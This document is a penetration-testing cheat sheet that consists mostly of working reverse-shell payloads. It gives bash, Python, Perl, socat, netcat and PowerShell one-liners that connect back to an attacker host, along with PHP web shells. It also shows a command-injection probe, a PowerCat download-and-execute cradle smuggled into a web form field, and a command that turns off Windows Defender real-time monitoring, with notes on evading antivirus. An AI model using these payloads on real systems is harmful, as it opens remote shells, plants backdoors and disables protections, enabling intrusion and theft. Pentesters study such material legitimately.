A **reverse shell** is a connection initiated **from the victim machine to the attacker’s machine**, giving the attacker remote command execution.

Reverse shells are commonly used in **penetration testing and post‑exploitation** because they often **bypass firewalls and NAT**, which usually block incoming connections but allow outbound traffic.

⚠️ **Best practice:** always try to use **common ports** such as:

- `80` (HTTP)
    
- `443` (HTTPS)
    
- `53` (DNS)
    

These ports are more likely to be allowed by firewalls.

---

## Common Reverse Shell Commands

### Linux Reverse Shells

#### 1. Bash Reverse Shell

```bash
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1"
```

#### 2. Python Reverse Shell

```bash
python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("<ATTACKER_IP>",<ATTACKER_PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])'
```

#### 3. Perl Reverse Shell

```bash
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<ATTACKER_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### 4. Socat Reverse Shell

```bash
socat TCP:<ATTACKER_IP>:<ATTACKER_PORT> EXEC:/bin/sh
```

---

#### 5. Netcat Reverse Shell

```bash
nc -e /bin/bash <ATTACKER_IP> <ATTACKER_PORT>
```

Works only with **netcat‑traditional**. Many systems disable `-e`.

---

### PHP Reverse Shells

#### 1. Basic PHP Command Execution

```php
<?php system($_GET['cmd']); ?>
```


#### 2. PHP Web Shell

```html
<html>
<body>
<form method="GET">
<input type="text" name="cmd" autofocus size="80">
<input type="submit" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd'] . ' 2>&1');
}
?>
</pre>
</body>
</html>
```

---

## Windows Reverse Shells

### PowerShell Reverse Shell (Standard)

A full PowerShell reverse shell can be used when we have command execution and want an interactive session:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<ATTACKER_PORT>);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
}
```

#### PowerShell Reverse Shell (One-liner)

More compact and commonly used in real scenarios:

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<ATTACKER_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Used frequently for AV evasion due to its inline execution.

#### Netcat Reverse Shell (Windows)

```bash
nc.exe -e cmd.exe <ATTACKER_IP> <ATTACKER_PORT>
```

Requires `nc.exe` to be present on the target.


#### Detecting Execution Context (CMD vs PowerShell)

When exploiting command injection, it is critical to know which interpreter is used.

```bash
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

- Outputs `CMD` → running in CMD
    
- Outputs `PowerShell` → running in PowerShell
    


```bash
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://<target>/archive
```

This allows adapting payloads depending on the backend.

#### Reverse Shell via PowerCat (Download Cradle)

If PowerShell is available, a more reliable method is to load an external tool like **PowerCat**.

```bash
# Step 1: Serve PowerCat
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python3 -m http.server 80
# Step 2: Start Listener
nc -nvlp 4444
# Step 3: Inject Reverse Shell
IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p 4444 -e powershell
# Step 4: Exploit via HTTP
curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F<ATTACKER_IP>%2Fpowercat.ps1%22)%3Bpowercat%20-c%20<ATTACKER_IP>%20-p%204444%20-e%20powershell' http://<target>/archive
```


---

## Disable Antivirus (Windows Defender)

In some lab or post‑exploitation scenarios, Windows Defender may block shell execution.

### Disable Real‑Time Monitoring

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, **attempt to execute the reverse shell again**.

This requires **administrator privileges**.
